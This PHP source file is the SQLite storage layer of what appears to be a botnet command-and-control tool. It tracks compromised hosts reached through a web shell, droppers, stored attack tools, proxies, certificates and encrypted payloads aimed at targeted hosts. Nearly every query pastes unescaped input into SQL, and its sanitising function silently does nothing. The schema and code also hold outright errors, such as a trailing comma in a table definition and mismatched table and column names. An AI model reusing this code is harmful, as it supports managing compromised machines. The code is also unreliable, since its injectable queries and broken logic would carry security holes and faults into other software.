<?php

class slopSqlite extends SQLite3
{
    function __construct($filename, $flags = SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE, $encryptionKey = null)
    {
        if (empty($encryptionKey)){
            $encryptionKey = bin2hex(openssl_random_pseudo_bytes(25));
            print("Please use this key to call the database: $encryptionKey".PHP_EOL);
        }
        parent::__construct($filename, $flags, $encryptionKey);
    }

    function __destruct(){
        parent::close();
    }
    private function buildTables(string $caller): string
    {
        $current_host = $_SERVER['HTTP_HOST'];
        $prepare_tables = <<< EOF
CREATE TABLE IF NOT EXISTS sloppy_bots_main(
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, 
    datetime TIMESTAMP DEFAULT 
    CURRENT_TIMESTAMP NOT NULL, 
    rhost TEXT UNIQUE NOT NULL, 
    uri TEXT NOT NULL DEFAULT '/slopshell.php', 
    uuid TEXT UNIQUE NOT NULL, 
    os_flavor TEXT NOT NULL, 
    check_in INTEGER DEFAULT 0 NOT NULL
);
CREATE TABLE IF NOT EXISTS sloppy_bots_slim_droppers(
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
    date_added TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
    location_on_disk TEXT UNIQUE NOT NULL,
    caller_domain TEXT NOT NULL DEFAULT '-',
    cookiename TEXT NOT NULL DEFAULT '-',
    cookievalue TEXT NOT NULL DEFAULT '-',
    user_agent TEXT NOT NULL DEFAULT 'sp/1.1',
);
CREATE TABLE IF NOT EXISTS sloppy_bots_domains(
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
    date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    uses INTEGER NOT NULL DEFAULT 0,
    from_domain TEXT NOT NULL DEFAULT '$current_host'
);
CREATE TABLE IF NOT EXISTS sloppy_bots_tools(
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
    date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    tool_name TEXT UNIQUE NOT NULL,
    target TEXT NOT NULL,
    base64_encoded_tool TEXT UNIQUE NOT NULL,
    keys TEXT UNIQUE,
    tags TEXT UNIQUE,
    iv TEXT UNIQUE,
    cipher TEXT NOT NULL DEFAULT 'NONE',
    hmac_hash TEXT UNIQUE,
    lang TEXT NOT NULL,
    is_encrypted BOOLEAN DEFAULT false
);
CREATE TABLE IF NOT EXISTS sloppy_bots_certs(
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
    date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    cert_location_on_disk TEXT UNIQUE NOT NULL,
    base64_encoded_cert TEXT UNIQUE NOT NULL,
    csr TEXT UNIQUE,
    pub TEXT UNIQUE,
    pem TEXT UNIQUE,
    cipher TEXT DEFAULT '-',
    is_encrypted BOOLEAN DEFAULT FALSE,
    priv_key_pass TEXT UNIQUE NOT NULL,
    rotated BOOLEAN NOT NULL DEFAULT FALSE
);
CREATE TABLE IF NOT EXISTS sloppy_bots_proxies(
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
    date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    proxy_schema TEXT NOT NULL DEFAULT '-',
    proxy TEXT UNIQUE NOT NULL,
    times_used INTEGER NOT NULL DEFAULT 0,
    last_domain_contacted TEXT NOT NULL DEFAULT '-',
    proxy_still_viable BOOLEAN NOT NULL DEFAULT TRUE,
    round_trip_time INTEGER NOT NULL DEFAULT 0,
    time_outs INTEGER NOT NULL DEFAULT 0,
    successful_responses INTEGER NOT NULL DEFAULT 0
);
CREATE TABLE IF NOT EXISTS sloppy_deployer(
  id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
  encrypted_contents TEXT NOT NULL,
  pem_used TEXT NOT NULL DEFAULT 'NONE',
  targeted_host TEXT NOT NULL
);
EOF;
        if ($this->exec($prepare_tables) === true){
            return "Successful!\n";
        }else{
            if (str_contains($caller, "local")) {
                return "There was an issue:".PHP_EOL.$this->lastErrorMsg().PHP_EOL;
            }else {
                return "oops" . PHP_EOL;
            }
        }
    }

    private function quote(string $s): string
    {
        preg_replace('/[\']|[\"]|[\\x]|[\%]|[0x]|[select]|[drop]|[sqlite_ma]|[update]|[and]|[or]|[wher]|[functio]|[--]|[\/\/]|[unio]|[\\u]|[#]|[\s]|[\b]|[\cY]|[[:punct:]]|[[:xdigit:]]|[[:graph:]]|[[:cntrl:]]|[[:blank:]]/gmi', '', $s);
        return $s;
    }

    public function verifySchema(): array{
        $result = $this->query('SELECT * FROM sqlite_master;');
        $r = [
            "schema" => "",
            "Success" => false
        ];
        foreach ($result->fetchArray(SQLITE3_BOTH) as $schema){
            $r['schema'] .= $schema;
        }
        if (strlen($r['schema']) != 0){
            $r['Success'] = true;
        }
        return $r;
    }

    public function checkDataBase(string $caller): bool|string
    {
        if (file_exists('includes/db/sqlite3_repo/sloppy_db.sqlite')){
            return true;
        }else{
            return $this->buildTables($caller);
        }
    }

    public function insertData(array $data): bool{
        switch ($data["action"]){
            case str_contains($data['action'], "add_bot"):
                try{
                    $this->exec(sprintf("INSERT INTO sloppy_bots_main(rhost, uri, uuidd, os_flavor, check_in) VALUES ('%s', '%s', '%s', '%s', '%s');",
                        $data['rhost'],
                        $this->quote($data['uri']),
                        $this->quote($data['uuid']),
                        $this->quote($data['os_flavor']),
                        $this->quote($data['check_in']) ?? 1
                    ));
                    return true;
                }catch (PDOException $e){
                    print("Insert main table Error: " . $this->lastErrorMsg() . PHP_EOL);
                    return false;
                }
            case str_contains($data['action'], "add_dropper"):
                try {
                    $this->exec(sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, caller_domain, cookiename, cookievalue, user_agent) VALUES('%s', '%s', '%s', '%s', '%s');",
                        $data['location_on_disk'],
                        $data['caller_domain'],
                        $data['cookiename'],
                        $data['cookievalue'],
                        $data['user_agent']
                    ));
                    return true;
                }catch (PDOException $e){
                    print("Insert dropper Error: " . $this->lastErrorMsg() . PHP_EOL);
                    return false;
                }
            case str_contains($data['action'], 'add_cert'):
                try{
                    $this->exec(sprintf("INSERT INTO sloppy_bots_certs(cert_location_on_disk, base64_encoded_cert, csr, pub, pem, cipher, is_encrypted, priv_key_pass) VALUES ('%s','%s','%s','%s','%s','%s','%s','%s');",
                        $data['cert_location'],
                        $data['base64_data'],
                        $data['csr'],
                        $data['pub'],
                        $data['pem'],
                        $data['cipher'],
                        $data['is_encrypted'],
                        $data['priv_key_pass']
                    ));
                    return true;
                }catch (PDOException $e){
                    print("Insert certificate error: " . $this->lastErrorMsg() . PHP_EOL);
                    return false;
                }
            case str_contains($data['action'], "proxies"):
                try{
                    $this->exec(sprintf("INSERT INTO sloppy_bots_proxies(proxy_schema, proxy) VALUES('%s', '%s');",
                        $data['proxy_schema'],
                        $data['proxy']
                    ));
                    return true;
                }catch (PDOException $e){
                    print("Insert proxy error: " . $this->lastErrorMsg() . PHP_EOL);
                    return false;
                }
            case str_contains($data['action'], "add_tool_encrypted"):
                try{
                    $this->exec(sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, keys, tags, iv, cipher, hmac_hash, lang, is_encrypted) VALUES('%s','%s','%s','%s','%s','%s','%s','%s','%s','%s');",
                        $data['tool_name'],
                        $data['target'],
                        $data['base64_data'],
                        $data['key'],
                        $data['tag'],
                        $data['iv'],
                        $data['cipher'],
                        $data['hmac_hash'],
                        $data['lang'],
                        $data['is_encrypted']
                    ));
                    return true;
                }catch (PDOException $e){
                    print("Insert encrypted tool error: " . $this->lastErrorMsg() . PHP_EOL);
                    return false;
                }
            case str_contains($data['action'], "add_tool"):
                try{
                    $this->exec(sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, lang, is_encrypted) VALUES('%s','%s','%s','%s', '%s');",
                        $data['tool_name'],
                        $data['target'],
                        $data['base64_data'],
                        $data['lang'],
                        $data['is_encrypted']
                    ));
                    return true;
                }catch (PDOException $e){
                    print("Insert tool error: " . $this->lastErrorMsg() . PHP_EOL);
                    return false;
                }
            case str_contains($data['action'], "add_domain"):
                try{
                    $this->exec(sprintf("INSERT INTO sloppy_bots_domains(from_domain) VALUES('%s');",
                        $data['domain_name']
                    ));
                    return true;
                }catch (PDOException $e){
                    print("Insert domain error: " . $this->lastErrorMsg() . PHP_EOL);
                    return false;
                }
            default:
                print("Action was empty, cannot handle this.");
                return false;
        }
    }

    public function grabAndFormatOutput(array $data){
        switch ($data['call']){
            case strpos($data['call'], "multi"):
                $type_call = "multi";
                break;
            default:
                $type_call = "single";
                break;

        }
        switch ($data['type']) {
            case str_contains($data['type'], "all_bots"):
                return $this->grabAllBots();
            case str_contains($data['type'], "single_bot"):
                return $this->grabSingleBot($data['bot']);
            case str_contains($data['type'], "proxy"):
                if (isset($data['schema'])){
                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_proxies WHERE proxy_schema = '%s' LIMIT %s", $data['schema'], $data['limit']);
                }else{
                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_proxies WHERE proxy = '%s'", $data['proxy_ip']);
                }
                break;
            case str_contains($data['type'], 'proxy_assign'):
                return $this->query(sprintf("SELECT proxy FROM sloppy_bots_proxies WHERE id = '%s'", $data['proxy_id']));
            case str_contains($data['type'], "dropper"):
                $sqlfrag = "SELECT * FROM sloppy_bots_slim_droppers";
                break;
            case str_contains($data['type'], "tools"):
                if (isset($data['target'])){
                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_tools WHERE target = '%s'", $data['target']);
                }elseif (isset($data['lang'])){
                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_tools WHERE lang = '%s'", $data['lang']);
                }elseif (isset($data['is_encrypted'])){
                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_tools WHERE is_encrypted = '%s'", $data['is_encrypted']);
                }else{
                    $sqlfrag = "SELECT * FROM sloppy_bots_tools";
                }
                break;
            case str_contains($data['type'], 'pullSlop'):
                $sqlfrag = sprintf("SELECT encrypted_contents, pem_used FROM sloppy_deployer WHERE targeted_host = '%s'", $data['rhost']);
                break;
            default:
                break;
        }
        if (isset($sqlfrag)) {
            if ($type_call === "single") {
                return $this->querySingle($sqlfrag, true);
            }else{
                return $this->query($sqlfrag);
            }
        }else{
            return null;
        }
    }
    private function grabAllBots(){
        return [
            'count' => $this->query("SELECT COUNT(*) FROM (SELECT * FROM sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP"),
            "bots" => $this->query("SELECT * FROM sloppy_bots_main")
        ];
    }
    private function grabSingleBot(string $bot_id){
        return [
            'bot' => $this->query(sprintf("SELECT * FROM sloppy_bots_main WHERE rhost = '%s'", $bot_id))
        ];
    }
}
